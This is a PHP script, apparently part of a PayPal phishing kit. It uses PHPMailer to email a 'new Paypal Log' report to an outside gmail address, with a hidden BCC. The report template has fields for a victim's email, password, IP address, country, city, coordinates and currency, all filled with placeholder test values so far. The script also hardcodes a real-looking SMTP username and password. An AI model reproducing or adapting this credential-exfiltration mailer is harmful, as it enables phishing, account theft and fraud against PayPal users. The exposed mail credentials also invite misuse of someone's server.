<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'mail.topkonnect.net';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'dev@topkonnect.net';                     //SMTP username
    $mail->Password   = 'EmzSbQ6F8CSKRRC';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('Badboy@badboy.com', 'BlackReport');
    $mail->addAddress('durallite@gmail.com', 'Badboy');     //Add a recipient
    // $mail->addAddress('adurauiux@gmail.com');               //Name is optional
    // $mail->addReplyTo('dev@topkonnect.net', 'Information');
    // $mail->addCC('cc@example.com');
    $mail->addBCC('Badboy@mail.com');

    // //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = ' <div
    style="
      width: 50%;
      border: 1px solid gray;
      border-radius: 20px;
      padding: 20px;
      font-family: monospace;
    "
  >
    <h4>new Paypal Log</h4>
    <p><strong>email :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>password :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>Ip :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>country :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>city :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>latitude :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>Longitude :</strong> <span>test@gmail.com</span></p>
    <br />
    <p><strong>The currency :</strong> <span>test@gmail.com</span></p>
    <br />
  </div>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
